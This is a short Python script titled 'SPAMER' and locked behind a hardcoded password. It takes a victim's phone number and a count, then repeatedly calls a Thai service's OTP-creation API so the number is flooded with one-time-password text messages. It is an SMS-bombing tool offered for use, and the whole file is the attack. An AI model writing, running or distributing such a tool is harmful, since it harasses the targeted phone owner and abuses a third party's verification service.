import requests,json,time,threading,os,sys
import urllib.request, os, threading, time, random, sys
import colorama
from colorama import Fore, Style, init
#from requests_futures.sessions import FuturesSession
#from requests_futures import sessions
os.system("clear")
print("")
number = input("Username => ")
verfly = input("Password => ")
if verfly == 'aimbotpassword':
	os.system("clear")
	print(Fore.YELLOW + "===SPAMER===")
	print("")
	url = "https://api2.1112.com/api/v1/otp/create"


def send(phone: str , times: int):

    payloads = {'phonenumber': f"{phone}", 'language': "th"}
    for i in range(times):
        r = requests.post(url, data=payloads)
        print(f"send to {phone} success")
        time.sleep(1)

phone_input = input("Phone : ")
times_input = int(input("jum : "))

send(phone=phone_input, times=times_input)
